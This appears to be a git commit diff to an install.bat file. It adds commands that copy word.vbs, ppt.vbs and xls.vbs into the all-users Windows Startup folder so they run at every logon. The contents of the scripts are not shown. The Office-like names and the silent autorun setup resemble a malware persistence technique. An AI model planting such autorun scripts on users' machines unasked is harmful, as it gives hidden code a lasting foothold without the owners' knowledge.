b12dfc05aa53073e8f153802786ac6dd53902317
沫雨~(=^▽^=) <hujl_123@yeah.net>
2017-01-18 08:34:02 -0600

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,1 +1,3 @@
-copy word.vbs 
+copy word.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+copy ppt.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+copy xls.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
